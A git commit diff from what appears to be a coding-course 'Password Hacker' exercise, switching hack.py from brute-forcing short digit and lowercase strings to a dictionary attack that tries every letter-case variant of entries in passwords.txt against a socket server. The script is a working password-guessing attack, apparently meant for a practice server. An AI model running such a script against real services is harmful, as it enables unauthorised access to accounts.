7d8f18c42687ceffbedbee404dd744a5c52e3880
liuyunan <liuyunan.20@gmail.com>
2022-03-17 12:00:25 -0700

    get password from file, change letters in password in the file to lower or upper

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -2,26 +2,27 @@ import socket
 import sys
 import itertools
 import string
+import os
 
 
 def hack_password(address, port):
     my_socket = socket.socket()
     my_socket.connect((address, port))
-    password_element = list(string.digits + string.ascii_lowercase)
-    password_length = 1
-    while True:
-        passwords = itertools.combinations(password_element, password_length)
-        for password in passwords:
-            msg = "".join(password)
-            my_socket.send(msg.encode())
-            response = my_socket.recv(1024)
-            if response.decode() == "Connection success!":
-                my_socket.close()
-                return msg
-            if response.decode() == "Too many attempts":
-                my_socket.close()
-                return "Too many attempts"
-        password_length += 1
+    os.chdir('/Users/liudawei/Desktop/Password Hacker/Password Hacker/task/hacking')
+    with open('passwords.txt', 'r') as password_file:
+        for line in password_file:
+            letters = list(zip(list(line.strip().lower()), list(line.strip().upper())))
+            passwords = itertools.product(*letters)
+            for password in passwords:
+                msg = "".join(password)
+                my_socket.send(msg.encode())
+                response = my_socket.recv(1024)
+                if response.decode() == "Connection success!":
+                    my_socket.close()
+                    return msg
+                if response.decode() == "Too many attempts":
+                    my_socket.close()
+                    return "Too many attempts"
 
 
 result = hack_password(sys.argv[1], int(sys.argv[2]))
